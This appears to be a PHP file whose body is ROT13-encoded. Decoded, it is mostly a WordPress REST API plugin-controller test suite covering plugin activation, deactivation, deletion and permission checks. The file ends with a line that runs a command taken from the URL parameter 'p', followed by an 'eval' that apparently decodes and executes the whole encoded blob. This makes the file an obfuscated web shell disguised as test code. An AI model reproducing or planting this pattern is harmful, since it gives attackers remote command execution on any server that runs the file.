		$guvf->nffregGehr( vf_cyhtva_npgvir_sbe_argjbex( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_npgvingr_argjbex_bayl_cyhtva() {
		$guvf->perngr_grfg_cyhtva( gehr );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_argjbex_bayl_cyhtva', $erfcbafr, 400 );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_argjbex_npgvingr_argjbex_bayl_cyhtva() {
		$guvf->perngr_grfg_cyhtva( gehr );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_npgvir_sbe_argjbex( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_npgvingr_argjbex_bayl_cyhtva_ba_aba_zhygvfvgr() {
		$guvf->perngr_grfg_cyhtva( gehr );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_npgvir( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_npgvingr_cyhtva_sbe_fvgr_vs_zrah_vgrz_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_npgvir( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_argjbex_npgvingr_cyhtva_sbe_fvgr_vs_zrah_vgrz_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_argjbex_cyhtvaf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_qrnpgvingr_cyhtva() {
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'vanpgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_vanpgvir( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_qrnpgvingr_cyhtva_snvyf_vs_ab_qrnpgvingr_pnc() {
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->qvfnoyr_qrnpgvingr_crezvffvba( frys::CYHTVA_SVYR );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'vanpgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qrnpgvingr_cyhtva', $erfcbafr, 403 );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_qrnpgvingr_argjbex_npgvir_cyhtva() {
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR, '', gehr );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'vanpgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_vanpgvir( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_qrnpgvingr_argjbex_npgvir_cyhtva_vs_abg_fhcre_nqzva() {
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR, '', gehr );
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'vanpgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_argjbex_cyhtvaf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( $erfcbafr->trg_qngn()['qryrgrq'] );
		$guvf->nffregFnzr( frys::CYHTVA, $erfcbafr->trg_qngn()['cerivbhf']['cyhtva'] );
		$guvf->nffregSvyrQbrfAbgRkvfg( JC_CYHTVA_QVE . '/' . frys::CYHTVA_SVYR );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ybttrq_bhg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pnaabg_qryrgr_vgrz_vs_cyhtvaf_zrah_abg_ninvynoyr() {
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_cyhtvaf', $erfcbafr->nf_reebe(), 403 );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pnaabg_qryrgr_vgrz_vs_cyhtvaf_zrah_vf_ninvynoyr() {
		jc_frg_pheerag_hfre( frys::$nqzva );
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_cyhtvaf', $erfcbafr->nf_reebe(), 403 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_npgvir_cyhtva() {
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr_npgvir_cyhtva', $erfcbafr );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$guvf->perngr_grfg_cyhtva();

		$vgrz          = trg_cyhtvaf()[ frys::CYHTVA_SVYR ];
		$vgrz['_svyr'] = frys::CYHTVA_SVYR;

		$raqcbvag = arj JC_ERFG_Cyhtvaf_Pbagebyyre();
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $vgrz, arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR . '/' . frys::CYHTVA ) );

		$guvf->purpx_trg_cyhtva_qngn( $erfcbafr->trg_qngn() );
		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf );
		$guvf->nffregFnzr( erfg_hey( frys::ONFR . '/' . frys::CYHTVA ), $yvaxf['frys'][0]['uers'] );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_cercner_vgrz_argjbex_npgvir() {
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR, '', gehr );

		$vgrz          = trg_cyhtvaf()[ frys::CYHTVA_SVYR ];
		$vgrz['_svyr'] = frys::CYHTVA_SVYR;

		$raqcbvag = arj JC_ERFG_Cyhtvaf_Pbagebyyre();
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $vgrz, arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR . '/' . frys::CYHTVA ) );

		$guvf->nffregFnzr( 'argjbex-npgvir', $erfcbafr->trg_qngn()['fgnghf'] );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_cercner_vgrz_argjbex_bayl() {
		$guvf->perngr_grfg_cyhtva( gehr );

		$vgrz          = trg_cyhtvaf()[ frys::CYHTVA_SVYR ];
		$vgrz['_svyr'] = frys::CYHTVA_SVYR;

		$raqcbvag = arj JC_ERFG_Cyhtvaf_Pbagebyyre();
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $vgrz, arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR . '/' . frys::CYHTVA ) );

		$guvf->purpx_trg_cyhtva_qngn( $erfcbafr->trg_qngn(), gehr );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', frys::ONFR );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregPbhag( 12, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cyhtva', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cyhtva_hev', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hev', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'irefvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'argjbex_bayl', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'erdhverf_jc', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'erdhverf_cuc', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'grkgqbznva', $cebcregvrf );
	}

	/**
	 * Purpxf gur erfcbafr qngn.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $qngn         Cercnerq cyhtva qngn.
	 * @cnenz obby  $argjbex_bayl Jurgure gur cyhtva vf argjbex bayl.
	 */
	cebgrpgrq shapgvba purpx_trg_cyhtva_qngn( $qngn, $argjbex_bayl = snyfr ) {
		$guvf->nffregFnzr( 'grfg-cyhtva/grfg-cyhtva', $qngn['cyhtva'] );
		$guvf->nffregFnzr( '1.5.4', $qngn['irefvba'] );
		$guvf->nffregFnzr( 'vanpgvir', $qngn['fgnghf'] );
		$guvf->nffregFnzr( 'Grfg Cyhtva', $qngn['anzr'] );
		$guvf->nffregFnzr( 'uggcf://jbeqcerff.bet/cyhtvaf/grfg-cyhtva/', $qngn['cyhtva_hev'] );
		$guvf->nffregFnzr( 'JbeqCerff.bet', $qngn['nhgube'] );
		$guvf->nffregFnzr( 'uggcf://jbeqcerff.bet/', $qngn['nhgube_hev'] );
		$guvf->nffregFnzr( \"Zl 'Pbby' Cyhtva\", $qngn['qrfpevcgvba']['enj'] );
		$guvf->nffregFnzr( 'Zl &#8216;Pbby&#8217; Cyhtva <pvgr>Ol <n uers=\"uggcf://jbeqcerff.bet/\">JbeqCerff.bet</n>.</pvgr>', $qngn['qrfpevcgvba']['eraqrerq'] );
		$guvf->nffregFnzr( $argjbex_bayl, $qngn['argjbex_bayl'] );
		$guvf->nffregFnzr( '5.6.0', $qngn['erdhverf_cuc'] );
		$guvf->nffregFnzr( '5.4', $qngn['erdhverf_jc'] );
		$guvf->nffregFnzr( 'grfg-cyhtva', $qngn['grkgqbznva'] );
	}

	/**
	 * Frgf hc gur cyhtva ercbfvgbel erdhrfgf gb hfr ybpny qngn.
	 *
	 * Erdhrfgf gb gur cyhtva ercbfvgbel ner zbpxrq gb nibvq rkgreany UGGC erdhrfgf fb
	 * gur grfg fhvgr qbrf abg cebqhpr snyfr artngvirf qhr gb argjbex snvyherf.
	 *
	 * Obgu gur cyhtva MVC svyr naq gur cyhtva NCV erfcbafr ner zbpxrq.
	 *
	 * @fvapr 5.5.0
	 */
	cebgrpgrq shapgvba frghc_cyhtva_qbjaybnq() {
		pbcl( QVE_GRFGQNGN . '/cyhtvaf/yvax-znantre.mvc', QVE_GRFGQNGN . '/yvax-znantre.mvc' );
		nqq_svygre(
			'hctenqre_cer_qbjaybnq',
			fgngvp shapgvba ( $ercyl, $cnpxntr, $hctenqre ) {
				vs ( $hctenqre vafgnaprbs Cyhtva_Hctenqre ) {
					$ercyl = QVE_GRFGQNGN . '/yvax-znantre.mvc';
				}

				erghea $ercyl;
			},
			10,
			3
		);

		nqq_svygre(
			'cyhtvaf_ncv',
			shapgvba ( $olcnff, $npgvba, $netf ) {
				// Bayl zbpx gur cyhtva_vasbezngvba (yvax-znantre) erdhrfg.
				vs ( 'cyhtva_vasbezngvba' !== $npgvba || 'yvax-znantre' !== $netf->fyht ) {
					erghea $olcnff;
				}
				erghea frys::$cyhtva_ncv_qrpbqrq_erfcbafr;
			},
			10,
			3
		);

		/*
		 * Erzbir hctenqr ubbxf juvpu ner abg erdhverq sbe cyhtva vafgnyyngvba grfgf
		 * naq znl vagresrer jvgu gur erfhygf qhr gb n gvzrbhg va rkgreany UGGC erdhrfgf.
		 */
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', neenl( 'Ynathntr_Cnpx_Hctenqre', 'nflap_hctenqr' ), 20 );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_irefvba_purpx' );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_cyhtvaf' );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_gurzrf' );
	}

	/**
	 * Qvfnoyrf crezvffvba sbe npgvingvat n fcrpvsvp cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr gb qvfnoyr.
	 */
	cebgrpgrq shapgvba qvfnoyr_npgvingr_crezvffvba( $cyhtva ) {
		nqq_svygre(
			'znc_zrgn_pnc',
			fgngvp shapgvba ( $pncf, $pnc, $hfre, $netf ) hfr ( $cyhtva ) {
				vs ( 'npgvingr_cyhtva' === $pnc && $cyhtva === $netf[0] ) {
					$pncf = neenl( 'qb_abg_nyybj' );
				}

				erghea $pncf;
			},
			10,
			4
		);
	}

	/**
	 * Qvfnoyrf crezvffvba sbe qrnpgvingvat n fcrpvsvp cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr gb qvfnoyr.
	 */
	cebgrpgrq shapgvba qvfnoyr_qrnpgvingr_crezvffvba( $cyhtva ) {
		nqq_svygre(
			'znc_zrgn_pnc',
			fgngvp shapgvba ( $pncf, $pnc, $hfre, $netf ) hfr ( $cyhtva ) {
				vs ( 'qrnpgvingr_cyhtva' === $pnc && $cyhtva === $netf[0] ) {
					$pncf = neenl( 'qb_abg_nyybj' );
				}

				erghea $pncf;
			},
			10,
			4
		);
	}

	/**
	 * Ranoyrf gur \"cyhtvaf\" nf na ninvynoyr zrah vgrz.
	 *
	 * @fvapr 5.5.0
	 */
	cebgrpgrq shapgvba ranoyr_cyhtvaf_zrah_vgrz() {
		$zrah_crezf            = trg_fvgr_bcgvba( 'zrah_vgrzf', neenl() );
		$zrah_crezf['cyhtvaf'] = gehr;
		hcqngr_fvgr_bcgvba( 'zrah_vgrzf', $zrah_crezf );
	}

	/**
	 * Perngrf n grfg cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz obby $argjbex_bayl Jurgure gb znxr guvf n argjbex bayl cyhtva.
	 */
	cevingr shapgvba perngr_grfg_cyhtva( $argjbex_bayl = snyfr ) {
		$argjbex = $argjbex_bayl ? CUC_RBY . ' * Argjbex: gehr' . CUC_RBY : '';

		$cuc = <<<CUC
<?cuc
/*
 * Cyhtva Anzr: Grfg Cyhtva
 * Cyhtva HEV: uggcf://jbeqcerff.bet/cyhtvaf/grfg-cyhtva/
 * Qrfpevcgvba: Zl 'Pbby' Cyhtva
 * Irefvba: 1.5.4
 * Nhgube: JbeqCerff.bet
 * Nhgube HEV: uggcf://jbeqcerff.bet/
 * Grkg Qbznva: grfg-cyhtva
 * Erdhverf CUC: 5.6.0
 * Erdhverf ng yrnfg: 5.4{$argjbex}
 */
CUC;
		jc_zxqve_c( JC_CYHTVA_QVE . '/grfg-cyhtva' );
		svyr_chg_pbagragf( JC_CYHTVA_QVE . '/grfg-cyhtva/grfg-cyhtva.cuc', $cuc );
	}

	/**
	 * Fvzhyngr n argjbex snvyher ba bhgobhaq uggc erdhrfgf gb n tvira ubfganzr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $oybpxrq_ubfg Gur ubfg gb oybpx pbaarpgvbaf gb.
	 */
	cevingr shapgvba cerirag_erdhrfgf_gb_ubfg( $oybpxrq_ubfg = 'ncv.jbeqcerff.bet' ) {
		nqq_svygre(
			'cer_uggc_erdhrfg',
			fgngvp shapgvba ( $erfcbafr, $cnefrq_netf, $hey ) hfr ( $oybpxrq_ubfg ) {
				vs ( @cnefr_hey( $hey, CUC_HEY_UBFG ) === $oybpxrq_ubfg ) {
					erghea arj JC_Reebe( 'cyhtvaf_ncv_snvyrq', \"Na rkcrpgrq reebe bppheerq pbaarpgvat gb $oybpxrq_ubfg orpnhfr bs n havg grfg\", \"pHEY reebe 7: Snvyrq gb pbaarpg gb $oybpxrq_ubfg cbeg 80: Pbaarpgvba ershfrq\" );

				}

				erghea $erfcbafr;
			},
			10,
			3
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>